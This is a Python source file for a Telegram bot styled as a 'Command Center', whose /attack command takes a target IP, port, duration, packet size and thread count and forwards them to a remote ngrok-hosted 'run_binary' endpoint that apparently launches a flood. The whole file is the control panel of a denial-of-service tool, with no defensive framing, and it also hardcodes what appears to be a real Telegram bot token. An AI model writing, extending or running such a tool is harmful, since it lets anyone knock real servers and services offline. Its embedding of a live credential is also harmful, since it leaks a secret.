import asyncio
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

# Replace with your Telegram bot token and public server URL
TELEGRAM_BOT_TOKEN = "7642417497:AAGPamqcy9UQ7FhDNHYbLcfBqCeEcEk2IjE"  # Replace with your bot token
SERVER_PUBLIC_URL = "https://dee5-2a05-d016-7a8-9800-90d-9073-d263-6203.ngrok-free.app/run_binary"  # Replace with your server's ngrok URL

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the Command Center! 🔥*\n\n"
        "*Use /attack <ip> <port> <time> <packet_size> <threads>*\n\n"
        "*Example:* /attack 127.0.0.1 8080 60 1024 4\n"
        "*Let the operation begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    # Extract arguments from the /attack command
    args = context.args
    if len(args) != 5:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Usage: /attack <ip> <port> <time> <packet_size> <threads>*",
            parse_mode='Markdown'
        )
        return

    try:
        # Parse parameters
        ip = args[0]
        port = int(args[1])
        time = int(args[2])
        packet_size = int(args[3])
        threads = int(args[4])

        # Prepare payload for the server
        payload = {
            "ip": ip,
            "port": port,
            "time": time,
            "packet_size": packet_size,
            "threads": threads
        }

        # Make a POST request to the server
        response = requests.post(SERVER_PUBLIC_URL, json=payload)
        response_data = response.json()

        # Send the server's response back to the user
        output = response_data.get("output", "No output from server.")
        error = response_data.get("error", None)
        if error:
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error:* {error}", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=chat_id, text=f"*✅ Success!*\n*Output:* {output}", parse_mode='Markdown')

    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️ Failed to execute the command:* {str(e)}",
            parse_mode='Markdown'
        )

def main():
    # Initialize the bot application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Add handlers for /start and /attack commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()
    